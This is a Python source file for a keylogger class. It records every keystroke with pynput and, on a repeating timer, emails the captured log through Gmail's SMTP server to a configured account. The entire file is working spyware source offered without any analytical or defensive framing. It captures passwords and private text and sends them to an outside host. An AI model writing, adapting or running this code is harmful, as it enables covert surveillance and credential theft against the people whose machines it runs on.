import pynput.keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, interval, email, password):
        self.log = ""
        self.interval = interval
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log += string

    def keystroke(self, key):
        try:
            self.append_log(str(key.char))
        except AttributeError:
            if str(key) == "Key.space":
                self.append_log(" ")
            else:
                self.append_log(" " + str(key) + " ")

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_email(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.keystroke)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
